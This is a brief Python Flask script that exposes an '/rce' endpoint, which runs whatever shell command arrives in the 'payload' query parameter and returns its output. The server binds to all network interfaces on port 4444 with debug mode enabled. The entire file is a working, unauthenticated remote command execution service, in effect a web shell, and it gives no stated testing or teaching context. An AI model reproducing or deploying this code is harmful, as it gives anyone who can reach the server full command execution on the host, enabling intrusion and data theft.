import subprocess
from flask import Flask, request
app = Flask(__name__)

@app.route("/rce", methods=["GET"])
def validate():
    return run_command(request.args.get("payload"))

def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
    
if __name__ == "__main__":
    app.run(port=4444, host='0.0.0.0', debug=True)